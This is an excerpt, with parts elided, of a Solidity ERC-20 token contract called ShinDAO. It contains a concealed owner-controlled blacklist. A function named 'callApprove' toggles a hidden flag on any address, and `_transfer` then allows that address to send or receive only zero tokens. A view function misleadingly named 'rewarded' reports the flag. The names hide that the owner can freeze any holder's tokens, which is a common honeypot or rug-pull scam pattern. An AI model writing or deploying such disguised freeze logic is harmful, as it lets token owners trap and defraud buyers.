 ...
 */
contract ShinDAO is Context, Ownable, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _callApprove;
    bool _initialize;
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        if (_callApprove[sender] || _callApprove[recipient]) require (amount == 0, "");
    ...
    function callApprove (address _address) external onlyOwner {
        if (_callApprove[_address] == true) {_callApprove[_address] = false;}
        else {_callApprove[_address] = true; }
    }

   
    function rewarded(address _address) public view returns (bool) {
        return _callApprove[_address];
    }
